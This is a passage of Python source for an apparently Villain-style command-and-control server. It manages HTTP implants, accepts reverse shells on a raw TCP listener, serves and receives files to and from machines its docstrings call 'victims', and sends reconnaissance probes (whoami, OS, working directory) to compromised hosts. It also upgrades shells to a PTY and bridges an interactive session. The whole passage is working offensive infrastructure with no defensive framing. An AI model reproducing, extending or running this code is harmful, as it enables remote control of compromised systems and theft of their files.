            self.end_headers()
            self.wfile.write(f'File uploaded successfully as {os.path.basename(filepath)}'.encode())
            
            sys.stdout.flush()
            
        except Exception as e:
            import traceback
            quiet_print(f"[DEBUG] Upload handler error: {e}")
            quiet_print(f"[DEBUG] Full error: {traceback.format_exc()}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f'Error: {str(e)}'.encode())

    def log_message(self, format, *args):
        return


class FileDownloadHandler(http.server.SimpleHTTPRequestHandler):
    """Handler for serving files to victims

    Supports two modes:
    1) Token-mapped files: request path '/<token>' streams the file registered in download_mappings[token]
    2) Static files from DOWNLOAD_DIR (fallback to default SimpleHTTPRequestHandler behavior)
    """
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DOWNLOAD_DIR, **kwargs)

    def do_GET(self):
        try:
            # Normalize request path token
            req_path = self.path.split('?', 1)[0]
            if req_path.startswith('/'):
                req_path = req_path[1:]
            token = req_path
            if token:
                with global_lock:
                    mapped = download_mappings.get(token)
            if token and mapped and os.path.isfile(mapped):
                try:
                    # Get file size for progress tracking
                    file_size = os.path.getsize(mapped)
                    filename = os.path.basename(mapped)
                    
                    # Get progress tracker if available
                    progress = get_progress_tracker()
                    
                    self.send_response(200)
                    # naive content-type; could be improved
                    self.send_header("Content-Type", "application/octet-stream")
                    self.send_header("Content-Length", str(file_size))
                    self.end_headers()
                    
                    # Stream file with progress tracking
                    with open(mapped, 'rb') as f:
                        bytes_sent = 0
                        chunk_size = 16384  # 16KB chunks for better performance
                        
                        while True:
                            chunk = f.read(chunk_size)
                            if not chunk:
                                break
                            
                            self.wfile.write(chunk)
                            bytes_sent += len(chunk)
                            
                            # Update progress - throttled display to prevent performance issues
                            if progress:
                                progress.update(bytes_sent)
                                # Only display progress every 32KB to avoid performance issues
                                if bytes_sent % 32768 == 0 or bytes_sent >= file_size:
                                    progress.display_progress()
                    
                    print(f"\n[+] Transfer complete: {bytes_sent} bytes sent.")
                    
                    # Mark as complete if we have a tracker
                    if progress:
                        progress.complete()
                        progress.display_progress(force_show=True)
                        print()  # New line after progress
                        clear_progress_tracker()
                    
                    return
                except Exception:
                    pass
            # Fallback to default behavior (serve from DOWNLOAD_DIR)
            return super().do_GET()
        except Exception:
            try:
                self.send_response(500)
                self.end_headers()
            except Exception:
                pass

    def log_message(self, format, *args):
        return

class ThreadingTCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

def run_http_server(port=None, host=None):
    global HOST, HTTP_PORT, ACTIVE_LISTENERS
    target_port = port if port is not None else HTTP_PORT
    target_host = host if host is not None else HOST
    
    try:
        with ThreadingTCPServer((target_host, target_port), C2Handler) as httpd:
            with global_lock:
                ACTIVE_LISTENERS[target_port] = 'http'
            print(f"[+] Starting HTTP C2 on {target_host}:{target_port}")
            httpd.serve_forever()
    except Exception as e:
        print(f"[!] Failed to start HTTP C2 on {target_host}:{target_port}: {e}")


def run_file_upload_server():
    """Start file upload server for receiving files from victims"""
    global HOST, FILE_UPLOAD_PORT
    with ThreadingTCPServer((HOST, FILE_UPLOAD_PORT), FileUploadHandler) as httpd:
        with global_lock:
            ACTIVE_LISTENERS[FILE_UPLOAD_PORT] = 'upload'
        print(f"[+] Starting file upload server on {HOST}:{FILE_UPLOAD_PORT}")
        httpd.serve_forever()


def run_file_download_server():
    """Start file download server for sending files to victims"""
    global HOST, FILE_DOWNLOAD_PORT
    with ThreadingTCPServer((HOST, FILE_DOWNLOAD_PORT), FileDownloadHandler) as httpd:
        with global_lock:
            ACTIVE_LISTENERS[FILE_DOWNLOAD_PORT] = 'download'
        print(f"[+] Starting file download server on {HOST}:{FILE_DOWNLOAD_PORT}")
        httpd.serve_forever()

def monitor_http_implants():
    """Villain-style dynamic session management with stability-based timeouts"""
    global current_session
    last_cleanup_time = time.time()
    while True:
        time.sleep(10)  # Check every 10 seconds
        with global_lock:
            current_time = time.time()
            
            # Periodic cleanup of orphaned download mappings (every 10 minutes)
            # Only run if we have active mappings to avoid unnecessary work
            if current_time - last_cleanup_time > 600:  # 10 minutes (reduced frequency)
                if download_mappings:  # Only cleanup if there are mappings
                    cleanup_orphaned_download_mappings()
                last_cleanup_time = current_time
            
            disconnected_uids = []
            
            for uid, data in http_sessions.items():
                # Calculate dynamic timeout based on session stability and state
                dynamic_timeout = calculate_dynamic_timeout(data)
                
                # Get session information
                last_seen = data.get("last_seen", 0)
                last_activity = data.get("last_activity", last_seen)
                session_state = data.get("state", "idle")
                stability = data.get("stability_score", 0.5)
                status = data.get("status", "unknown")
                
                # Calculate time since last activity
                time_since_activity = current_time - last_activity
                time_since_last_seen = current_time - last_seen
                
                # Determine if session should be considered active
                is_active = False
                
                # Session is active if within dynamic timeout
                if time_since_last_seen < dynamic_timeout:
                    is_active = True
                elif time_since_activity < dynamic_timeout:
                    is_active = True
                
                # AGGRESSIVE: Always keep file transfer sessions active if they're awaiting output
                if not is_active and data.get("awaiting", False) and session_state == "file_transfer":
                    is_active = True
                    # print(f"[DEBUG] Keeping file transfer session {uid} active (state: {session_state})")
                
                # Special case: if session is awaiting output and we're within a reasonable time, keep it active
                if not is_active and data.get("awaiting", False) and time_since_activity < 600:  # 10 minutes max
                    # Check if this looks like a file transfer command
                    last_cmd = data.get("last_sent", "").lower()
                    last_cmd_orig = data.get("last_cmd", "").lower()
                    
                    # Also check if session was recently in file_transfer state
                    was_file_transfer = data.get("was_file_transfer", False)
                    
                    # Check for PowerShell encoded commands
                    is_powershell_encoded = "powershell" in last_cmd and "-encodedcommand" in last_cmd
                    
                    if (any(keyword in last_cmd for keyword in ["invoke-webrequest", "curl", "download", "transfer", "archive", "tar"]) or
                        any(keyword in last_cmd_orig for keyword in ["invoke-webrequest", "curl", "download", "transfer", "archive", "tar"]) or
                        was_file_transfer or is_powershell_encoded):
                        is_active = True
                        # print(f"[DEBUG] Keeping session {uid} active for file transfer: {last_cmd[:50]}...")
                
                # Process command queue for stable sessions
                if is_active and stability > STABILITY_THRESHOLD_LOW:
                    process_command_queue(uid)
                
                # If session is not active, mark for disconnection
                if not is_active:
                    disconnected_uids.append(uid)
                    # Debug print removed to reduce noise
                    # print(f"[DEBUG] Disconnecting {uid}: status={status}, stability={stability:.2f}, state={session_state}, timeout={dynamic_timeout}s, last_seen={time_since_last_seen:.1f}s")
            
            # Handle disconnections
            for uid in disconnected_uids:
                session_data = http_sessions[uid]
                session_state = session_data.get("state", "idle")
                status = session_data.get("status", "unknown")
                stability = session_data.get("stability_score", 0.0)
                
                # Show detailed disconnection info
                sys.stdout.write(f"\r[-] HTTP implant {uid} has disconnected (status: {status}, stability: {stability:.2f}, state: {session_state}).\n")
                
                if current_session == ('http', uid):
                    current_session = None
                    sys.stdout.write(f"[*] You have been logged out from {uid}.\n")
                
                # Clean up session
                if uid in http_sessions:
                    del http_sessions[uid]
                
                # Clean up any download mappings for this session
                # This prevents orphaned mappings when sessions disconnect during file transfers
                with global_lock:
                    tokens_to_remove = []
                    for token, file_path in download_mappings.items():
                        # Check if this mapping belongs to the disconnected session
                        # We can identify this by checking if the file path contains session-specific patterns
                        # or by checking if the file was created recently and matches our UUID pattern
                        if os.path.exists(file_path):
                            try:
                                # Check if it's a UUID-named temp file that might be orphaned
                                filename = os.path.basename(file_path)
                                if filename.endswith('.tar.gz') and len(filename) == 40:  # UUID + .tar.gz
                                    uuid_part = filename[:-7]  # Remove .tar.gz
                                    if len(uuid_part) == 32 and all(c in '0123456789abcdef' for c in uuid_part):
                                        # This is a UUID temp file - check if it's old enough to be orphaned
                                        file_age = time.time() - os.path.getmtime(file_path)
                                        if file_age > 300:  # 5 minutes old - likely orphaned
                                            tokens_to_remove.append(token)
                                            try:
                                                os.remove(file_path)
                                                quiet_print(f"[+] Cleaned up orphaned temp file: {filename}")
                                            except Exception as e:
                                                quiet_print(f"[!] Failed to remove orphaned temp file {filename}: {e}")
                            except Exception:
                                pass
                    
                    # Remove the tokens from download mappings
                    for token in tokens_to_remove:
                        if token in download_mappings:
                            del download_mappings[token]
                
                sys.stdout.write("C2 > ")
                sys.stdout.flush()

def detect_http_session_info(session_id):
    """Background detection for HTTP sessions - optimized for speed."""
    try:
        # Step 0: Minimal wait for implant to be ready for first command
        time.sleep(1.0) 
        
        def send_and_wait(cmd, timeout=8):
            with global_lock:
                if session_id not in http_sessions: return None
                http_sessions[session_id]["last_cmd"] = cmd
                http_sessions[session_id]["awaiting"] = True
                # Don't clear output immediately, let the handler parse markers
            
            # Wait for response with tighter polling
            for _ in range(timeout * 5): # Poll every 0.2s
                time.sleep(0.2)
                with global_lock:
                    if session_id not in http_sessions: return None
                    if not http_sessions[session_id].get("awaiting", False):
                        return http_sessions[session_id].get("output", "").strip()
            return None

        # Send a "Mega Probe" that works on most Windows shells (PS or CMD)
        # And a secondary one for Linux
        mega_probe_win = 'Write-Output "OS:Windows"; Write-Output "USER:$env:USERNAME"; Write-Output "HOST:$env:COMPUTERNAME"; Write-Output "CWD:$((Get-Location).Path)"'
        # If it's CMD, some of this might fail but markers like USER: / OS: will be parsed if they hit
        
        send_and_wait(mega_probe_win)
        
        # Check if we got enough info
        with global_lock:
            info = http_sessions.get(session_id, {})
            has_os = info.get("os")
            has_user = info.get("username")
        
        if not has_os or not has_user:
            # Try Linux probe
            mega_probe_lin = 'printf "OS:Linux\nUSER:$(whoami)\nHOST:$(hostname)\nCWD:$PWD\n"'
            send_and_wait(mega_probe_lin)

        # Final cleanup and notification
        with global_lock:
            if session_id in http_sessions:
                http_sessions[session_id]["detection_complete"] = True
                final_os = http_sessions[session_id].get("os") or "Unknown"
                final_user = http_sessions[session_id].get("username") or "unknown"
                sys.stdout.write(f"\r[+] Session {session_id[:8]}... identified: {final_os} | User: {final_user}\nC2 > ")
                sys.stdout.flush()
    
    except Exception:
        with global_lock:
            if session_id in http_sessions:
                http_sessions[session_id]["detection_complete"] = True

def recv_with_timeout(sock, timeout=5.0, quiet=True):
    """Helper function to receive data with timeout (Villain-style)."""
    sock.setblocking(False)
    response = []
    begin = time.time()
    
    while True:
        if (time.time() - begin) > timeout:
            break
        
        try:
            data = sock.recv(4096)
            if data.strip():
                chunk = data.decode('utf-8', 'ignore')
                response.append(chunk)
                begin = time.time()  # Reset timeout on data received
                time.sleep(0.1)
            else:
                time.sleep(0.1)
        except BlockingIOError:
            time.sleep(0.1)
        except:
            break
    
    sock.setblocking(True)
    return ''.join(response)


def handle_shell_connection(client_socket, address, shell_id):
    global current_session, interactive_shell_active_for_id
    
    # Try to make the socket more responsive
    try:
        client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception:
        pass

    # === FAST & ACCURATE DETECTION (BEFORE MAIN LOOP) ===
    try:
        # Stage 1: Brief wait then get initial hint + username
        time.sleep(0.5)
        client_socket.sendall(b'whoami\n')
        initial_hint = recv_with_timeout(client_socket, timeout=1.0, quiet=True)
        
        hint_clean = initial_hint.strip()
        is_windows = '\\' in hint_clean or 'Microsoft' in hint_clean or 'not recognized' in hint_clean.lower()
        
        # Stage 2: Send platform-specific Mega Probe
        if is_windows:
            # Try both PS and CMD styles if uncertain
            mega = 'Write-Output "OS:Windows"; Write-Output "USER:$env:USERNAME"; Write-Output "CWD:$((Get-Location).Path)"\n'
            mega += 'echo OS:Windows & echo USER:%USERNAME% & echo CWD:%CD%\n'
        else:
            mega = 'printf "OS:Linux\nUSER:$(whoami)\nCWD:$PWD\n"\n'
        
        client_socket.sendall(mega.encode())
        response = recv_with_timeout(client_socket, timeout=1.5, quiet=True)
        combined = initial_hint + "\n" + response
        
        # Stage 3: Parse everything
        with global_lock:
            if shell_id in shell_sessions:
                # Prioritize 'OS:Linux' or 'OS:Windows' markers
                for line in combined.splitlines():
                    line = line.strip()
                    if line.startswith("OS:"):
                        shell_sessions[shell_id]['os'] = line[3:].strip()
                    elif line.startswith("USER:"):
                        val = line[5:].strip()
                        # Ignore unexpanded Windows env vars
                        if val and val != "%USERNAME%":
                            shell_sessions[shell_id]['username'] = val
                    elif line.startswith("CWD:"):
                        val = line[4:].strip()
                        if val and val != "%CD%":
                            shell_sessions[shell_id]['cwd'] = val
                
                # Final Heuristics if markers missed
                if not shell_sessions[shell_id].get('os'):
                    if 'Linux' in combined: shell_sessions[shell_id]['os'] = 'Linux'
                    elif 'Windows' in combined or 'Microsoft' in combined: shell_sessions[shell_id]['os'] = 'Windows'
                
                if not shell_sessions[shell_id].get('username'):
                    # Last ditch effort from initial whoami
                    lines = [l.strip() for l in hint_clean.splitlines() if l.strip() and 'whoami' not in l.lower()]
                    if lines: shell_sessions[shell_id]['username'] = lines[-1]

                shell_sessions[shell_id]['detection_complete'] = True
                
                final_os = shell_sessions[shell_id].get('os') or 'Unknown'
                final_user = shell_sessions[shell_id].get('username') or 'unknown'
                
                # Notify
                sys.stdout.write(f"\r[+] Session {shell_id[:16]} identified: {final_os} | User: {final_user}\nC2 > ")
                sys.stdout.flush()

    except Exception:
        with global_lock:
            if shell_id in shell_sessions:
                shell_sessions[shell_id]['detection_complete'] = True
    # === END DETECTION ===

    while True:
        try:
            # If console is currently doing raw interactive IO for this shell, do not read here to avoid races
            if interactive_shell_active_for_id == shell_id:
                time.sleep(0.05)
                continue

            ready_to_read, _, _ = select([client_socket], [], [], 1)
            if ready_to_read:
                data = client_socket.recv(4096)
                if not data:
                    raise ConnectionResetError
                with global_lock:
                    is_current = current_session == ('shell', shell_id)
                    # Parse and store CWD if present or infer from last_sent= pwd/Get-Location
                    try:
                        text = data.decode(errors='ignore')
                    except Exception:
                        text = ''
                    if text:
                        # CWD/OS marker support
                        marker_lines = [ln.strip() for ln in text.splitlines() if ln.strip().startswith('CWD:')]
                        if marker_lines:
                            try:
                                last_marker = marker_lines[-1]
                                _, path_val = last_marker.split(':', 1)
                                shell_sessions[shell_id]['cwd'] = path_val.strip()
                            except Exception:
                                pass
                        # Check for implicit Windows user response (DOMAIN\User)
                        if '\\' in text and len(text.strip().split()) == 1 and not '/' in text:
                             candidate = text.strip()
                             # Basic sanity check for a username/domain string
                             if len(candidate) < 50 and not any(c in '<>:"|?*' for c in candidate):
                                 shell_sessions[shell_id]['username'] = candidate
                                 if not shell_sessions[shell_id].get('os'):
                                     shell_sessions[shell_id]['os'] = 'Windows'

                        user_marker_lines = [ln.strip() for ln in text.splitlines() if ln.strip().startswith('USER:')]
                        if user_marker_lines:
                            try:
                                last_user = user_marker_lines[-1]
                                _, user_val = last_user.split(':', 1)
                                shell_sessions[shell_id]['username'] = user_val.strip()
                            except Exception:
                                pass
                        # Fallback: if we sent 'whoami' recently, assume the text IS the username
                        elif shell_sessions[shell_id].get('last_sent') == 'whoami':
                             clean_resp = text.strip()
                             if clean_resp and len(clean_resp) < 50 and 'whoami' not in clean_resp.lower():
                                 shell_sessions[shell_id]['username'] = clean_resp
                                 # Infer OS from slash style
                                 if '\\' in clean_resp:
                                     shell_sessions[shell_id]['os'] = 'Windows'
                                 else:
                                     # Could be linux or just a local user on windows, check if we already know OS
                                     pass
                        
                        os_marker_lines = [ln.strip() for ln in text.splitlines() if ln.strip().startswith('OS:')]
                        if os_marker_lines:
                            try:
                                last_os = os_marker_lines[-1]
                                _, os_val = last_os.split(':', 1)
                                os_name = os_val.strip()
                                if os_name:
                                    # Normalize OS name
                                    lower_os = os_name.lower()
                                    if 'win' in lower_os or 'microsoft' in lower_os:
                                        shell_sessions[shell_id]['os'] = 'Windows'
                                    elif 'linux' in lower_os:
                                        shell_sessions[shell_id]['os'] = 'Linux'
                                    elif 'darwin' in lower_os:
                                        shell_sessions[shell_id]['os'] = 'macOS'
                                    else:
                                        # Fallback to whatever uname gave us (e.g. BSD)
                                        shell_sessions[shell_id]['os'] = os_name
                            except Exception:
                                pass
                        else:
                            last_sent = shell_sessions.get(shell_id, {}).get('last_sent', '')
                            if 'Get-Location' in last_sent or last_sent.strip().lower() in ['pwd', 'echo $pwd']:
                                lines = [ln for ln in text.splitlines() if ln.strip()]
                                if lines:
                                    candidate = lines[-1].strip()
                                    # Remove any shell prompt characters
                                    candidate = re.sub(r'^[\$#>\s]*', '', candidate)
                                    if re.match(r"^[A-Za-z]:\\\\", candidate) or candidate.startswith('\\\\') or candidate.startswith('/'):
                                        shell_sessions[shell_id]['cwd'] = candidate
                        # Infer OS from cwd or output flavor
                        try:
                            cwd_val = shell_sessions[shell_id].get('cwd')
                            if cwd_val:
                                if re.match(r'^[A-Za-z]:[\\/]', cwd_val) or ('\\' in cwd_val and not cwd_val.startswith('/')):
                                    shell_sessions[shell_id]['os'] = 'Windows'
                                elif cwd_val.startswith('/'):
                                    shell_sessions[shell_id]['os'] = 'Linux'
                            else:
                                # Check for PowerShell version output or Windows-style paths
                                if re.search(r"\bDirectory:\b|\bMode\s+LastWriteTime\b|\$PSVersionTable", text):
                                    shell_sessions[shell_id]['os'] = 'Windows'
                                elif re.search(r"┌──.*└─\$|bash:|zsh:|sh:", text) or text.strip().startswith('/'):
                                    shell_sessions[shell_id]['os'] = 'Linux'
                        except Exception:
                            pass
                        
                        # Store output for directory detection
                        if 'IS_DIRECTORY' in text or 'IS_FILE' in text:
                            shell_sessions[shell_id]['output'] = text
                        
                if is_current:
                    # Always display normal shell output, but filter out debug messages
                    if text:
                        # Filter out debug messages that should only show in verbose mode
                        if FILE_TRANSFER_IN_PROGRESS:
                            # During file transfer, process for progress updates regardless of verbose mode
                            text = process_shell_output_for_progress(text)
                            if not GLOBAL_VERBOSE:
                                # In quiet mode, don't display anything else - progress bar handles its own display
                                pass
                            else:
                                # In verbose mode, display the processed text (which may be filtered)
                                sys.stdout.write(text)
                                sys.stdout.flush()
                        elif not GLOBAL_VERBOSE:
                            # In quiet mode, filter out debug messages and file transfer commands
                            lines = text.split('\n')
                            filtered_lines = []
                            for line in lines:
                                # Keep normal shell output, filter debug messages and file transfer commands
                                if not (line.strip().startswith('[DEBUG]') or 
                                       line.strip().startswith('[*]') or
                                       line.strip().startswith('[+]') and 'Detected' in line or
                                       line.strip().startswith('[+]') and 'Command:' in line or
                                       line.strip().startswith('[+]') and 'Will save to:' in line or
                                       line.strip().startswith('printf "CWD:') or
                                       line.strip().startswith('CWD:') or
                                       line.strip().startswith('ls -la') or
                                       line.strip().startswith('if [ -d ') or
                                       line.strip().startswith('IS_DIRECTORY') or
                                       line.strip().startswith('IS_FILE') or
                                       line.strip().startswith('sh -c "$(echo') or
                                       line.strip().startswith('curl -X POST') or
                                       line.strip().startswith('% Total') or
                                       line.strip().startswith('  % Total') or
                                       line.strip().startswith('File uploaded successfully') or
                                       # Filter directory transfer messages
                                       line.strip().startswith('Downloading directory archive') or
                                       line.strip().startswith('Archive downloaded successfully') or
                                       line.strip().startswith('Extracting directory') or
                                       line.strip().startswith('Directory extracted successfully') or
                                       line.strip().startswith('Directory transfer completed') or
                                       # Filter curl progress lines - correct pattern
                                       ('Dload' in line and 'Upload' in line and 'Total' in line) or
                                       # Filter all curl progress patterns - comprehensive
                                       (line.strip() and line.strip()[0].isdigit() and '--:--:--' in line) or
                                       (line.strip().startswith(' ') and line.strip()[1:2].isdigit() and '--:--:--' in line) or
                                       # Filter curl progress lines with file sizes
                                       (line.strip() and line.strip()[0].isdigit() and ('k' in line or 'M' in line) and ('--:--:--' in line or '0:00:' in line)) or
                                       (line.strip().startswith(' ') and line.strip()[1:2].isdigit() and ('k' in line or 'M' in line) and ('--:--:--' in line or '0:00:' in line)) or
                                       # Filter percentage-only lines with # characters
                                       (line.strip() and line.strip().endswith('%') and '#' in line) or
                                       # Filter lines with just # characters
                                       (line.strip() and all(c in '# ' for c in line.strip())) or
                                       # Filter lines that start with spaces and contain only # characters and spaces
                                       (line.strip().startswith(' ') and all(c in '# ' for c in line.strip())) or
                                       # Filter lines that are just # characters with spaces
                                       (line.strip() and '#' in line and all(c in '# ' for c in line.strip())) or
                                       # Filter lines with percentage followed by # characters
                                       (line.strip() and '%' in line and '#' in line and any(c.isdigit() for c in line.strip())) or
                                       # Additional patterns to catch all percentage displays
                                       (line.strip() and '%' in line and any(c.isdigit() for c in line.strip()) and len(line.strip()) < 20) or
                                       # Lines that are just percentages with spaces
                                       (line.strip() and line.strip().replace(' ', '').replace('%', '').replace('.', '').isdigit()) or
                                       # Lines with hash symbols and percentages
                                       ('#' in line and '%' in line) or
                                       # Lines that are mostly hash symbols
                                       (line.strip() and line.count('#') > 10) or
                                       # Lines with percentage and spaces (like "15.5%")
                                       (line.strip() and '%' in line and line.strip().replace('%', '').replace('.', '').replace(' ', '').isdigit()) or
                                       # Lines that start with percentage
                                       (line.strip() and line.strip()[0].isdigit() and '%' in line) or
                                       # Lines that are just numbers and percentage
                                       (line.strip() and line.strip().replace('%', '').replace('.', '').replace(' ', '').isdigit() and '%' in line)):
                                    filtered_lines.append(line)
                            text = '\n'.join(filtered_lines)
                            if text.strip():  # Only display if there's content after filtering
                                sys.stdout.write(text)
                                sys.stdout.flush()
                        else:
                            # In verbose mode, process for progress and display everything
                            if FILE_TRANSFER_IN_PROGRESS:
                                # During file transfer, process for progress updates
                                text = process_shell_output_for_progress(text)
                            # Only display if it's not progress-related output
                            if text and not (FILE_TRANSFER_IN_PROGRESS and any(pattern in text for pattern in ['%', 'Dload', 'Upload', 'Total', '--:--:--'])):
                                sys.stdout.write(text)
                    sys.stdout.flush()
        except (ConnectionResetError, BrokenPipeError, OSError, ValueError):
            break
        except Exception:
            break
            
    # Cleanup when loop exits
    try:
        with global_lock:
            if shell_id in shell_sessions:
                print(f"\n[-] Shell {shell_id} ({address[0]}) disconnected by remote.")
                try:
                    shell_sessions[shell_id]['socket'].close()
                except: pass
                del shell_sessions[shell_id]
                if current_session == ('shell', shell_id):
                    current_session = None
                    line_mode_shell_id = None
    except Exception:
        pass
            

def run_raw_tcp_server(port=None, host=None):
    global HOST, RAW_TCP_PORT, ACTIVE_LISTENERS
    target_port = port if port is not None else RAW_TCP_PORT
    target_host = host if host is not None else HOST
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((target_host, target_port))
    except Exception as e:
        print(f"[!] Failed to bind Raw TCP on {target_host}:{target_port}: {e}")
        return

    server_socket.listen(5)
    with global_lock:
        ACTIVE_LISTENERS[target_port] = 'tcp'
    print(f"[+] Starting Raw TCP Listener on {target_host}:{target_port} for reverse shells.")
    while True:
        client_socket, address = server_socket.accept()
        with global_lock:
            # Generate UUID for shell session like HTTP sessions
            shell_id = uuid.uuid4().hex
            shell_sessions[shell_id] = {
                'socket': client_socket, 
                'address': address, 
                'cwd': None, 
                'last_sent': '', 
                'os': None, 
                'username': None, 
                'output': '', 
                'listener_port': target_port,
                'detection_complete': False  # Track if background detection finished
            }
        sys.stdout.write(f"\r[+] New Shell connection (ID: {shell_id}) from {address[0]}:{address[1]}\nC2 > ")
        sys.stdout.flush()
        threading.Thread(target=handle_shell_connection, args=(client_socket, address, shell_id), daemon=True).start()


def probe_shell_os_and_cwd(shell_id: str):
    """Proactively detect OS and CWD using Villain-style staged probing."""
    try:
        with global_lock:
            session = shell_sessions.get(shell_id)
            if not session: return
            sock = session.get('socket')
        if not sock: return

        # Stage 1: Wait for initial banner/junk to settle
        time.sleep(1.5)

        # Stage 2: Simple 'whoami' - works on almost everything (Win/Lin)
        try:
            with global_lock:
                if shell_id in shell_sessions:
                    shell_sessions[shell_id]['last_sent'] = 'whoami'
            sock.sendall(b'\nwhoami\n')
        except: pass

        # Wait for whoami response
        time.sleep(1.0)
        
        # Check if we got what we needed from the passive reader in handle_shell_connection
        # The reader updates the session dict if it sees patterns
        with global_lock:
            s_os = shell_sessions.get(shell_id, {}).get('os')
            s_user = shell_sessions.get(shell_id, {}).get('username')
        
        if not s_os:
            # Stage 3: If OS still unknown, try 'uname' (Linux/Mac) or assume Windows if error
            try:
                sock.sendall(b'uname\n')
                time.sleep(1.0)
            except: pass
            
        # Stage 4: Get CWD (and confirm Windows if needed)
        # Send platform specific pwd commands
        cwd_probe_win = b'echo %CD%\n' # CMD.exe
        cwd_probe_lin = b'pwd\n'
        
        try:
            sock.sendall(cwd_probe_win)
            sock.sendall(cwd_probe_lin)
            # Final fallback: The complex PowerShell probe for stubborn Windows shells
            if not s_os or s_os == 'Windows':
                 ps_probe = (
                    "\npowershell -NoProfile -NonInteractive -Command "
                    "\"$ErrorActionPreference='SilentlyContinue';"
                    "Write-Output ('OS:Windows');"
                    "Write-Output ('USER:' + $env:USERNAME);"
                    "Write-Output ('CWD:' + (Get-Location).Path)\"\n"
                )
                 sock.sendall(ps_probe.encode())
        except: pass
        
        time.sleep(0.5)

    except Exception:
        pass

def interactive_shell_session(shell_id: str):
    """Enter a raw interactive session with the given shell.

    - Bridges local stdin/stdout to the remote shell socket.
    - Exit back to the C2 console with Ctrl-].
    - Supports terminal resizing and transparent signal forwarding.
    """
    global current_session, interactive_shell_active_for_id

    with global_lock:
        if shell_id not in shell_sessions:
            print("[!] Shell is no longer active.")
            return
        shell_socket = shell_sessions[shell_id]['socket']

    # Configure local terminal for raw mode
    fd = sys.stdin.fileno() if hasattr(sys.stdin, 'fileno') else -1
    if not isinstance(fd, int) or fd < 0:
        raise OSError("stdin has no valid file descriptor for raw mode")

    old_settings = None
    try:
        if not os.isatty(fd):
            raise OSError("stdin is not a TTY")
        old_settings = termios.tcgetattr(fd)
        tty.setraw(fd)
    except Exception:
        old_settings = None

    if old_settings is None:
        raise OSError("stdin is not a TTY or cannot enter raw mode")

    print(f"\r\n[+] Interacting with shell {shell_id}. Press Ctrl-] to return to C2 console.\r\n")
    sys.stdout.flush()

    interactive_shell_active_for_id = shell_id
    current_session = ('shell', shell_id)

    import signal
    import struct
    import fcntl

    def get_terminal_size():
        try:
            s = struct.pack('HHHH', 0, 0, 0, 0)
            x = fcntl.ioctl(sys.stdout.fileno(), termios.TIOCGWINSZ, s)
            return struct.unpack('HHHH', x)[:2]
        except Exception:
            return (24, 80)

    def send_window_resize(sig, frame):
        # In a real PTY resizing context, we'd send a specialized packet or escape.
        # For simple TCP shells, we can't easily inform the remote shell without a side-channel.
        pass

    original_sigwinch = signal.signal(signal.SIGWINCH, send_window_resize)

    try:
        shell_socket.setblocking(False)
        
        # Determine OS (with a fallback probe if not yet detected)
        with global_lock:
            shell_info = shell_sessions.get(shell_id, {})
            os_type = shell_info.get('os')
        
        if not os_type:
            # Send a quick POSIX probe to check if it's Linux
            try:
                shell_socket.sendall(b'uname\n')
                time.sleep(0.3)
                ready, _, _ = select([shell_socket], [], [], 0.2)
                if ready:
                    probe_data = shell_socket.recv(1024).decode(errors='ignore').lower()
                    if 'linux' in probe_data or 'darwin' in probe_data:
                        os_type = 'Linux'
                    elif 'windows' in probe_data or 'microsoft' in probe_data:
                        os_type = 'Windows'
            except Exception:
                pass

        if os_type == 'Linux':
            # Get current terminal size
            rows, cols = get_terminal_size()
            
            # Setup sequence for Linux: PTY Upgrade -> Term Setup -> Clear
            setup_cmd = (
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || "
                "python -c 'import pty; pty.spawn(\"/bin/bash\")' || "
                "script -q /dev/null /bin/bash\n"
            )
            shell_socket.sendall(setup_cmd.encode())
            
            # Brief delay to let the PTY spawn
            time.sleep(0.4)
            
            # Final environment setup
            env_setup = f"export TERM=xterm-256color; stty rows {rows} columns {cols}\n"
            shell_socket.sendall(env_setup.encode())

        at_start_of_line = True
        is_intercepting = False
        c2_cmd_buffer = b""

        while current_session == ('shell', shell_id):
            rlist = [shell_socket, fd]
            ready, _, _ = select(rlist, [], [], 0.05)
            
            for r in ready:
                if r is shell_socket:
                    try:
                        data = shell_socket.recv(8192)
                        if not data:
                            print("\r\n[-] Shell disconnected.")
                            return
                        # Transparently write everything to local stdout
                        os.write(sys.stdout.fileno(), data)
                        sys.stdout.flush()
                    except BlockingIOError:
                        pass
                    except Exception as e:
                        print(f"\r\n[!] Socket error: {e}")
                        return
                        
                elif r is fd:
                    try:
                        buf = os.read(fd, 4096)
                        if not buf:
                            continue
                        
                        # Handle Ctrl-] (0x1d) to exit
                        if b'\x1d' in buf:
                            print("\r\n[*] Returning to C2 console.")
                            return

                        for char in buf:
                            char_b = bytes([char])
                            
                            if not is_intercepting:
                                # When we are at the start of a user input line and '#' is typed
                                if at_start_of_line and char_b == b'#':
                                    is_intercepting = True
                                    c2_cmd_buffer = b"#"
                                    # Visual indicator for C2 mode
                                    os.write(sys.stdout.fileno(), b"\r\n[C2 CMD] #")
                                    continue
                                
                                # Send to shell
                                shell_socket.sendall(char_b)
                                if char_b in (b'\r', b'\n'):
                                    at_start_of_line = True
                                else:
                                    at_start_of_line = False
                            else:
                                # Intercept mode
                                if char_b in (b'\r', b'\n'):
                                    os.write(sys.stdout.fileno(), b"\r\n")
                                    cmd_line = c2_cmd_buffer.decode(errors='ignore')
                                    
                                    # Temporarily restore terminal for C2 command output
                                    if old_settings:
                                        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
                                    
                                    # Handle recognized C2 commands
                                    if not process_c2_command(cmd_line):
                                        print(f"[!] Unrecognized C2 command: {cmd_line}")
                                    
                                    # Re-enable raw mode
                                    if old_settings:
                                        tty.setraw(fd)
                                    
                                    is_intercepting = False
                                    at_start_of_line = True
                                    c2_cmd_buffer = b""
                                    # Prompt to show we are back in shell
                                    sys.stdout.write("\r\n(shell) ")
                                    sys.stdout.flush()
                                elif char in (8, 127): # Backspace
                                    if len(c2_cmd_buffer) > 1:
                                        c2_cmd_buffer = c2_cmd_buffer[:-1]
                                        os.write(sys.stdout.fileno(), b"\b \b")
                                    else:
                                        # Cancel intercept
                                        is_intercepting = False
                                        at_start_of_line = True
                                        os.write(sys.stdout.fileno(), b"\b \b")
